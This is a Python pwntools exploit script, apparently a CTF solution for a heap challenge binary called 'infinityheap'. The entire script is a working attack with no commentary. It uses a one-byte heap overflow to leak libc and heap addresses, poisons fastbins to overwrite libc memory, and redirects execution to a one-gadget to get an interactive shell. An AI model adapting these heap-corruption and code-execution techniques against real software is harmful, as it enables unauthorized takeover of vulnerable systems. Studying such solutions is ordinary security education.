from pwn import *

r = process(["./infinityheap"],env={"LD_PRELOAD":"./libc.so.6"})

def add(size,content):
	r.sendlineafter(":","1")
	r.sendlineafter(":",str(size))
	r.sendafter(":",content)

def remove(idx):
	r.sendlineafter(":","2")
	r.sendlineafter(":",str(idx))
def show(idx):
	r.sendlineafter(":","3")
	r.sendlineafter(":",str(idx))

add(0x40,"a")
add(0x110,"a"*0xf1+"\x01")
remove(1)
add(0x110,"a"*0xf0)
add(0x110,"a")
add(0x30,"a")
remove(1)
remove(0)
add(0x48,"a"*0x48)
add(0x20,"a")
add(0x30,"a")
add(0x10,"a")
add(0x10,"a")
add(0x10,"a")
add(0x20,"a")

remove(1)
remove(2)
add(0x20,"a")
show(4)
libc = u64(r.recvn(6)+"\x00\x00") - 0x387b58
print hex(libc)
add(0x20,"a")
add(0xc0,"a")
remove(2)
show(4)
heap = u64(r.recvn(6)+"\x00\x00")-0x180
print hex(heap)
remove(9)
remove(6)
add(0x230,"a")
add(0x200,"a")
remove(6)
add(0x200,"a"*0x68+p64(heap+0x518))


add(0x60,"a"*0x10+p64(heap+0x5f8)) #9
add(0x60,"a") #10
add(0x60,"a"*0x10+p64(heap+0x6d0)) #11
add(0x60,"a") #12
add(0x60,"a"*0x8+p64(heap+0x740)) #13
add(0x60,p64(heap+0x6d0)) #14

remove(9)
add(0x60,"a"*8+p64(heap+0xe0))
remove(11)
add(0x60,"a"*8+p64(heap+0x518))
add(0x10,"a")
remove(9)
add(0x10,p64(libc+0x3897d0-0x10))
add(0x60,"a")
remove(13)
add(0x60,p64(heap+0x5f8))
add(0x10,"a")
remove(13)
add(0x10,p64(libc+0x387acd)) 
add(0x60,"a")
add(0x60,"a"*0x13+p64(libc+0xcbdb5))


r.sendlineafter(":","1")
r.sendlineafter(":","0")


r.interactive()
